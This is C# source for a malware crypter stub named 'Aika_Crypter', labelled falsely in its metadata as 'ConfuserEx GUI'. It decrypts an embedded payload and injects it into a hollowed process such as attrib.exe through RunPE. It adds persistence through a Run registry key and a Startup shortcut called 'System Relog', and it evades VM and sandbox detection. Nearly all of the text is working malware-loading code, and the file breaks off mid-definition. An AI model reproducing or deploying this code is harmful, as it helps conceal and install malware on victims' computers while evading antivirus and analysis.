using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Management;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Reflection;


[assembly: AssemblyTitle("ConfuserEx GUI")]
[assembly: AssemblyDescription("ConfuserEx")]
[assembly: AssemblyCompany("Ki")]
[assembly: AssemblyProduct("ConfuserEx")]
[assembly: AssemblyVersion("1.0.0")]
[assembly: AssemblyFileVersion("1.0.0")]
#pragma warning disable 0169
#pragma warning disable 0649

namespace Aika_Crypter
{
    static class Program
    {
        static Boolean Startup = %startup%;
        static Boolean IsNative = %native%;
        static Boolean SelfInj = %selfinj%;
        static Boolean AntiVM = %antivm%;
        static string key = "%key%";

        static void SetStartup()
        {
            try
            {
                string name = "System Relog";
                string currentFilename = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
                string fullpath = Environment.GetEnvironmentVariable("ProgramData") + "\\" + currentFilename;
                System.IO.File.Move(Environment.CurrentDirectory + "\\" + currentFilename, fullpath);
                string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (System.IO.File.Exists(folderPath + "\\" + name + ".url"))
                    return;
                using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + name + ".url"))
                {
                    streamWriter.WriteLine("[InternetShortcut]");
                    streamWriter.WriteLine("URL=file:///" + fullpath);
                    streamWriter.Flush();
                }
                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(name, (object)fullpath);
            }
            catch (Exception)
            {

            }
        }

        static byte[] Decrypt(byte[] encrypted)
        {
            byte[] result = null;
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Encoding.ASCII.GetBytes(key), Encoding.ASCII.GetBytes(key), 1000);
            using (Aes aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
                aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encrypted, 0, encrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
            }
            return result;
        }


        static bool DetectVM()
        {
            using (var searcher = new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox" || GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("SxIn.dll").ToInt32() != 0
                   || GetModuleHandle("SbieDll.dll").ToInt32() != 0 || GetModuleHandle("Sf2.dll").ToInt32() != 0 ||
                   GetModuleHandle("snxhk.dll").ToInt32() != 0)
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public static byte[] ExtractResource(String filename)
        {
            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
            using (Stream resFilestream = a.GetManifestResourceStream(filename))
            {
                if (resFilestream == null) return null;
                byte[] ba = new byte[resFilestream.Length];
                resFilestream.Read(ba, 0, ba.Length);
                return ba;
            }
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string running);
        static void Inject()
        {
            int num = 0;
            byte[] payload = Decrypt(ExtractResource("payload"));
            if (IsNative)
            {
                Native.InitAPI();
                if (SelfInj)
                    Native.Run(payload, Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1], string.Empty);
                else
                    Native.Run(payload, "C:\\Windows\\System32\\attrib.exe", string.Empty);
            }
            else
                MenaRunPE.Run(Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1], "", payload, 0x00000004 | 0x08000000, ref num);
        }

        [STAThread]
        static void Main()
        {
            if (AntiVM)
                if (DetectVM())
                    Environment.Exit(-1);
            if (Startup)
                SetStartup();
            Inject();
        }
    }
}
namespace Aika_Crypter
{
    public static class MenaRunPE
    {
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public byte lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAdress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        public static bool Run(string injectionpath, string cmd, byte[] payload, int creationflag, ref int reterrcode)
        {
            int cout = 1;
            while ((!HandleRun(injectionpath, cmd, payload, creationflag, ref reterrcode) ? 1 : 0) != 0)
            {
                ++cout;
                if (cout > 100)
                    return false;
            }
            return true;
        }
        private static long smethod_7(IntPtr ProcessHandle, long BaseAdress)
        {
            byte[] array = new byte[4];
            uint bytesread = 0u;
            NativeMethods.ReadProcessMemory(ProcessHandle, (IntPtr)(BaseAdress + 60L), array, 4, ref bytesread);
            NativeMethods.ReadProcessMemory(ProcessHandle, (IntPtr)(BaseAdress + (long)BitConverter.ToInt32(array, 0) + 40L), array, 4, ref bytesread);
            if (BitConverter.ToInt32(array, 0) == 0)
            {
                return 0L;
            }
            return BaseAdress + (long)BitConverter.ToInt32(array, 0);
        }

        private static bool smethod_6(ref byte[] byte_0, int int_1, int int_2)
        {
            int num = int_1 + (int)BitConverter.ToInt16(byte_0, int_1 + 20) + 24;
            int num2 = BitConverter.ToInt32(byte_0, num - 16);
            int destinationIndex = 0;
            if (num2 != 0)
            {
                int num4 = BitConverter.ToInt32(byte_0, num + 1 * 40 + 12);
                int num6 = BitConverter.ToInt32(byte_0, num + 1 * 40 + 12 + 4);
                int num7 = BitConverter.ToInt32(byte_0, num + 1 * 40 + 12 + 8);
                if (num2 > num4)
                {
                    if (num2 < num4 + num6)
                    {
                        destinationIndex = num2 - num4 + num7 + 16;
                        Array.Copy(BitConverter.GetBytes(int_2), 0, byte_0, destinationIndex, BitConverter.GetBytes(int_2).Length);
                        return true;
                    }
                }
            }
            return false;
        }

        private static int smethod_9(long long_0, long long_1, int int_1)
        {
            return (int)(long_0 - long_1 - (long)int_1);
        }
        private static bool smethod_8(long long_0, int int_1, long long_1, int int_2)
        {
            for (int index = 0; index <= int_1; ++index)
            {
                if (long_0 + (long)index == long_1)
                    return true;
            }
            for (int index = 0; index <= int_2; ++index)
            {
                if (long_1 + (long)index == long_0)
                    return true;
            }
            return false;
        }
        private static bool HandleRun(string Path, string Commands, byte[] payload, int createflag, ref int err)
        {
            PROCESS_INFORMATION PROCESS_INFORMATION = default(PROCESS_INFORMATION);
            try
            {
                string text = string.Format("\"{0}\"", Path);
                STARTUPINFO STARTUPINFO = default(STARTUPINFO);
                STARTUPINFO.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
                if (string.IsNullOrEmpty(Commands))
                {
                    if (!NativeMethods.CreateProcess(Path, text, IntPtr.Zero, IntPtr.Zero, true, (uint)createflag, IntPtr.Zero, Directory.GetCurrentDirectory(), ref STARTUPINFO, ref PROCESS_INFORMATION))
                    {
                        err = 1;
                        throw new Exception();
                    }
                }
                else
                {
                    text = text + " " + Commands;
                    if (!NativeMethods.CreateProcess(Path, text, IntPtr.Zero, IntPtr.Zero, true, (uint)createflag, IntPtr.Zero, Directory.GetCurrentDirectory(), ref STARTUPINFO, ref PROCESS_INFORMATION))
                    {
                        err = 2;
                        throw new Exception();
                    }
                }
                UIntPtr uIntPtr = UIntPtr.Zero;
                PROCESS_BASIC_INFORMATION PROCESS_BASIC_INFORMATION = default(PROCESS_BASIC_INFORMATION);
                bool flag = false;
                bool flag2 = false;
                long num = smethod_5(PROCESS_INFORMATION.ProcessHandle, ref flag, ref flag2, ref PROCESS_BASIC_INFORMATION, ref uIntPtr);
                byte[] array = new byte[4];
                byte[] array2 = new byte[8];
                uint num2 = 0;
                if (flag)
                {
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(num + 16L), array2, (uint)array2.Length, ref num2))
                    {
                        err = 3;
                        throw new Exception();
                    }
                }
                else
                {
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(num + 8L), array, (uint)array.Length, ref num2))
                    {
                        err = 4;
                        throw new Exception();
                    }
                }

                long num3 = 0L;
                if (flag)
                    num3 = smethod_7(PROCESS_INFORMATION.ProcessHandle, BitConverter.ToInt64(array2, 0));
                else
                    num3 = smethod_7(PROCESS_INFORMATION.ProcessHandle, (long)BitConverter.ToInt32(array, 0));

                int num4 = BitConverter.ToInt32(payload, 60);
                bool flag3 = false;
                if (BitConverter.ToInt16(payload, num4 + 4) != 332)
                    flag3 = true;

                smethod_6(ref payload, num4, 1);
                long num5 = 0L;

                if (flag3)
                    num5 = BitConverter.ToInt64(payload, num4 + 48);
                else
                    num5 = (long)BitConverter.ToInt32(payload, num4 + 52);

                byte[] array3 = new byte[4];
                if (flag)
                {
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(BitConverter.ToInt64(array2, 0) + 60L), array3, (uint)array3.Length, ref num2))
                    {
                        err = 5;
                        throw new Exception();
                    }
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(BitConverter.ToInt64(array2, 0) + (long)BitConverter.ToInt32(array3, 0) + 80L), array3, (uint)array3.Length, ref num2))
                    {
                        err = 7;
                        throw new Exception();
                    }
                    if (smethod_8(num5, BitConverter.ToInt32(payload, num4 + 80), BitConverter.ToInt64(array2, 0), BitConverter.ToInt32(array3, 0)) && (ulong)NativeMethods.NtUnmapViewOfSection(PROCESS_INFORMATION.ProcessHandle, (IntPtr)BitConverter.ToInt64(array2, 0)) != 0uL)
                    {
                        err = 10;
                        throw new Exception();
                    }
                }
                else
                {
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(BitConverter.ToInt32(array, 0) + 60), array3, (uint)array3.Length, ref num2))
                    {
                        err = 6;
                        throw new Exception();
                    }
                    if (!NativeMethods.ReadProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(BitConverter.ToInt32(array, 0) + BitConverter.ToInt32(array3, 0) + 80), array3, (uint)array3.Length, ref num2))
                    {
                        err = 8;
                        throw new Exception();
                    }
                    if (smethod_8(num5, BitConverter.ToInt32(payload, num4 + 80), (long)BitConverter.ToInt32(array, 0), BitConverter.ToInt32(array3, 0)) && (ulong)NativeMethods.NtUnmapViewOfSection(PROCESS_INFORMATION.ProcessHandle, (IntPtr)BitConverter.ToInt32(array, 0)) != 0uL)
                    {
                        err = 11;
                        throw new Exception();
                    }
                }
                long num6 = (long)NativeMethods.VirtualAllocEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num5, (uint)BitConverter.ToInt32(payload, num4 + 80), 12288u, 64u);
                if (num6 == 0L)
                {
                    throw new Exception();
                }
                if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num6, payload, (uint)BitConverter.ToInt32(payload, num4 + 84), ref num2))
                {
                    err = 12;
                    throw new Exception();
                }
                int num7 = num4 + (int)BitConverter.ToInt16(payload, num4 + 20) + 24;
                for (int i = 0; i <= (int)(BitConverter.ToInt16(payload, num4 + 6) - 1); i++)
                {
                    if (BitConverter.ToInt32(payload, num7 + i * 40 + 16) != 0)
                    {
                        byte[] array4 = new byte[BitConverter.ToInt32(payload, num7 + i * 40 + 16) - 1 + 1];
                        Array.Copy(payload, BitConverter.ToInt32(payload, num7 + i * 40 + 20), array4, 0, array4.Length);
                        if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(num6 + (long)BitConverter.ToInt32(payload, num7 + i * 40 + 12)), array4, (uint)array4.Length, ref num2))
                        {
                            err = 13;
                            throw new Exception();
                        }
                    }
                }

                if (flag)
                {
                    if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(num + 16L), BitConverter.GetBytes(num6), (uint)BitConverter.GetBytes(num6).Length, ref num2))
                    {
                        err = 14;
                        throw new Exception();
                    }
                }
                else
                {
                    if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)(num + 8L), BitConverter.GetBytes((int)num6), (uint)BitConverter.GetBytes((int)num6).Length, ref num2))
                    {
                        err = 15;
                        throw new Exception();
                    }
                }

                if (flag && num3 != 0L)
                {
                    byte[] array5 = new byte[] { 233, 0, 0, 0, 0 };
                    long num9 = num6 + (long)BitConverter.ToInt32(payload, num4 + 40);
                    if (num9 != 0L)
                    {
                        Array.Copy(BitConverter.GetBytes(smethod_9(num9, num3, array5.Length)), 0, array5, 1, BitConverter.GetBytes(num9).Length);
                    }
                    uint num10 = 0u;
                    NativeMethods.VirtualProtectEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num3, (uint)array5.Length, 64u, ref num10);

                    if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num3, array5, (uint)array5.Length, ref num2))
                    {
                        err = 16;
                        throw new Exception();
                    }
                    num2 = 64u;
                    NativeMethods.VirtualProtectEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num3, (uint)array5.Length, num10, ref num2);
                }
                else if (!flag && num3 != 0L)
                {

                    byte[] array6 = new byte[] { 233, 0, 0, 0, 0 };
                    int num11 = (int)(num6 + (long)BitConverter.ToInt32(payload, num4 + 40));
                    if (num11 != 0)
                    {
                        Array.Copy(BitConverter.GetBytes(smethod_9((long)num11, num3, array6.Length)), 0, array6, 1, BitConverter.GetBytes(num11).Length);
                    }
                    uint num12 = 0u;
                    NativeMethods.VirtualProtectEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num3, (uint)array6.Length, 64u, ref num12);
                    if (!NativeMethods.WriteProcessMemory(PROCESS_INFORMATION.ProcessHandle, (IntPtr)((int)num3), array6, (uint)array6.Length, ref num2))
                    {
                        err = 17;
                        throw new Exception();
                    }
                    num2 = 64u;
                    NativeMethods.VirtualProtectEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num3, (uint)array6.Length, num12, ref num2);
                }
                num2 = 0u;
                NativeMethods.VirtualProtectEx(PROCESS_INFORMATION.ProcessHandle, (IntPtr)num6, (uint)BitConverter.ToInt32(payload, num4 + 80), 32u, ref num2);
                IntPtr baseAddress = IntPtr.Zero;
                if (!NativeMethods.FlushInstructionCache(PROCESS_INFORMATION.ProcessHandle, baseAddress, 0u))
                {
                    err = 18;
                    throw new Exception();
                }
                NativeMethods.ResumeThread(PROCESS_INFORMATION.ThreadHandle);
                if (Process.GetProcessById((int)PROCESS_INFORMATION.ProcessId) == null)
                {
                    return false;
                }
            }
            catch
            {
                Process processById = Process.GetProcessById((int)PROCESS_INFORMATION.ProcessId);
                try
                {
                    if (processById != null)
                    {
                        processById.Kill();
                    }
                    return false;
                }
                catch
                {
                }
            }
            return true;
        }

        private static long smethod_5(IntPtr intptr_0, ref bool bool_1, ref bool bool_2, ref PROCESS_BASIC_INFORMATION struct3_0, ref UIntPtr uintptr_0)
        {
            if (IntPtr.Size == 4)
                bool_2 = false;
            else
                NativeMethods.IsWow64Process(intptr_0, ref bool_2);

            UIntPtr uIntPtr = UIntPtr.Zero;
            if (bool_2)
            {
                if ((ulong)NativeMethods.NtQueryInformationProcess2(intptr_0, 26u, ref uintptr_0, (uint)Marshal.SizeOf(uintptr_0), ref uIntPtr) != 0uL)
                {
                    throw new Exception();
                }
                bool_1 = false;
                return (long)((uint)uintptr_0);
            }

            if ((ulong)NativeMethods.NtQueryInformationProcess(intptr_0, 0u, ref struct3_0, (uint)Marshal.SizeOf(struct3_0), ref uIntPtr) != 0uL)
            {
                throw new Exception();
            }
            if (IntPtr.Size == 8)
            {
                bool_1 = true;
                return (long)struct3_0.PebBaseAdress;
            }
            bool_1 = false;
            return (long)((int)struct3_0.PebBaseAdress);
        }
    }
}
namespace Aika_Crypter
{
    public unsafe class Native
    {
        #region Structures

        #region DosHeader

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        #endregion

        #region NtHeader

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_NT_HEADERS
        {
            [FieldOffset(0)]
            public uint Signature;

            [FieldOffset(4)]
            public IMAGE_FILE_HEADER FileHeader;

            [FieldOffset(24)]
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        #region FileHeader

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        #endregion

        #region OptionalHeader

        #region Enums

        public enum MachineType : ushort
        {
            Native = 0,
            I386 = 0x014c,
            Itanium = 0x0200,
            x64 = 0x8664
        }
        public enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
        }
        public enum SubSystemType : ushort
        {
            IMAGE_SUBSYSTEM_UNKNOWN = 0,
            IMAGE_SUBSYSTEM_NATIVE = 1,
            IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
            IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
            IMAGE_SUBSYSTEM_POSIX_CUI = 7,
            IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
            IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
            IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
            IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
            IMAGE_SUBSYSTEM_EFI_ROM = 13,
            IMAGE_SUBSYSTEM_XBOX = 14

        }
        public enum DllCharacteristicsType : ushort
        {
            RES_0 = 0x0001,
            RES_1 = 0x0002,
            RES_2 = 0x0004,
            RES_3 = 0x0008,
            IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
            IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
            IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
            IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
            IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
            IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
            RES_4 = 0x1000,
            IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
            IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
        }

        #endregion

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            [FieldOffset(0)]
            public MagicType Magic;

            [FieldOffset(2)]
            public byte MajorLinkerVersion;

            [FieldOffset(3)]
            public byte MinorLinkerVersion;

            [FieldOffset(4)]
            public uint SizeOfCode;

            [FieldOffset(8)]
            public uint SizeOfInitializedData;

            [FieldOffset(12)]
            public uint SizeOfUninitializedData;

            [FieldOffset(16)]
            public uint AddressOfEntryPoint;

            [FieldOffset(20)]
            public uint BaseOfCode;

            // PE32 contains this additional field
            [FieldOffset(24)]
            public uint BaseOfData;

            [FieldOffset(28)]
            public uint ImageBase;

            [FieldOffset(32)]
            public uint SectionAlignment;

            [FieldOffset(36)]
            public uint FileAlignment;

            [FieldOffset(40)]
            public ushort MajorOperatingSystemVersion;

            [FieldOffset(42)]
            public ushort MinorOperatingSystemVersion;

            [FieldOffset(44)]
            public ushort MajorImageVersion;

            [FieldOffset(46)]
            public ushort MinorImageVersion;

            [FieldOffset(48)]
            public ushort MajorSubsystemVersion;

            [FieldOffset(50)]
            public ushort MinorSubsystemVersion;

            [FieldOffset(52)]
            public uint Win32VersionValue;

            [FieldOffset(56)]
            public uint SizeOfImage;

            [FieldOffset(60)]
            public uint SizeOfHeaders;

            [FieldOffset(64)]
            public uint CheckSum;

            [FieldOffset(68)]
            public SubSystemType Subsystem;

            [FieldOffset(70)]
            public DllCharacteristicsType DllCharacteristics;

            [FieldOffset(72)]
            public uint SizeOfStackReserve;

            [FieldOffset(76)]
            public uint SizeOfStackCommit;

            [FieldOffset(80)]
            public uint SizeOfHeapReserve;

            [FieldOffset(84)]
            public uint SizeOfHeapCommit;

            [FieldOffset(88)]
            public uint LoaderFlags;

            [FieldOffset(92)]
            public uint NumberOfRvaAndSizes;

            [FieldOffset(96)]
            public IMAGE_DATA_DIRECTORY ExportTable;

            [FieldOffset(104)]
            public IMAGE_DATA_DIRECTORY ImportTable;

            [FieldOffset(112)]
            public IMAGE_DATA_DIRECTORY ResourceTable;

            [FieldOffset(120)]
            public IMAGE_DATA_DIRECTORY ExceptionTable;

            [FieldOffset(128)]
            public IMAGE_DATA_DIRECTORY CertificateTable;

            [FieldOffset(136)]
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;

            [FieldOffset(144)]
            public IMAGE_DATA_DIRECTORY Debug;

            [FieldOffset(152)]
            public IMAGE_DATA_DIRECTORY Architecture;

            [FieldOffset(160)]
            public IMAGE_DATA_DIRECTORY GlobalPtr;

            [FieldOffset(168)]
            public IMAGE_DATA_DIRECTORY TLSTable;

            [FieldOffset(176)]
            public IMAGE_DATA_DIRECTORY LoadConfigTable;

            [FieldOffset(184)]
            public IMAGE_DATA_DIRECTORY BoundImport;

            [FieldOffset(192)]
            public IMAGE_DATA_DIRECTORY IAT;

            [FieldOffset(200)]
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;

            [FieldOffset(208)]
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;

            [FieldOffset(216)]
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        #endregion

        #endregion

        #region DataDirectory

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        #endregion

        #region ExportDirectory

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;
            public uint AddressOfNames;
            public uint AddressOfNameOrdinals;
        }

        #endregion

        #endregion

        #region CreateProcessW

        #region Structs

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        #endregion

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        private delegate bool t_CreateProcessW(
            string lpApplicationName,
            string lpCommandline,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        #endregion

        private static t_CreateProcessW CreateProcessW;

        #endregion

        #region GetThreadContext

        #region Structs

        private enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01,
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02,
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04,
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08,
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10,
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20,
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            public FLOATING_SAVE_AREA FloatSave;
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x200, ArraySubType = UnmanagedType.I1)]
            public byte[] ExtendedRegisters;
        }


        #endregion

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        #endregion

        private static t_GetThreadContext GetThreadContext;

        #endregion

        #region ReadProcessMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            uint nSize,
            out IntPtr lpNumberOfBytesRead);

        #endregion

        private static t_ReadProcessMemory ReadProcessMemory;

        #endregion

        #region NtUnmapViewOfSection

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int t_NtUnmapViewOfSection(IntPtr ProcessHandle, uint BaseAddress);

        #endregion

        private static t_NtUnmapViewOfSection NtUnmapViewOfSection;

        #endregion

        #region VirtualAllocEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr t_VirtualAllocEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    uint dwSize,
                                    uint flAllocationType,
                                    uint flProtect);

        #endregion

        private static t_VirtualAllocEx VirtualAllocEx;

        #endregion

        #region VirtualProtectEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_VirtualProtectEx(
                                        IntPtr hProcess,
                                        IntPtr lpAddress,
                                        uint dwSize,
                                        uint flNewProtect,
                                        ref uint lpflOldProtect);

        #endregion

        private static t_VirtualProtectEx VirtualProtectEx;

        #endregion

        #region WriteProcessMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_WriteProcessMemory(
                                    IntPtr hProcess,
                                    IntPtr lpBaseAddress,
                                    byte[] lpBuffer,
                                    uint nSize,
                                    ref uint lpNumberOfBytesWritten);


        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_WriteProcessMemory2(
                                    IntPtr hProcess,
                                    IntPtr lpBaseAddress,
                                    IntPtr lpBuffer,
                                    uint nSize,
                                    IntPtr lpNumberOfBytesWritten);

        #endregion

        private static t_WriteProcessMemory WriteProcessMemory;
        private static t_WriteProcessMemory2 WriteProcessMemory2;

        #endregion

        #region SetThreadContext

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_SetThreadContext(IntPtr hThread, ref CONTEXT CTX);

        #endregion

        private static t_SetThreadContext SetThreadContext;

        #endregion

        #region ResumeThread

        #region Definition

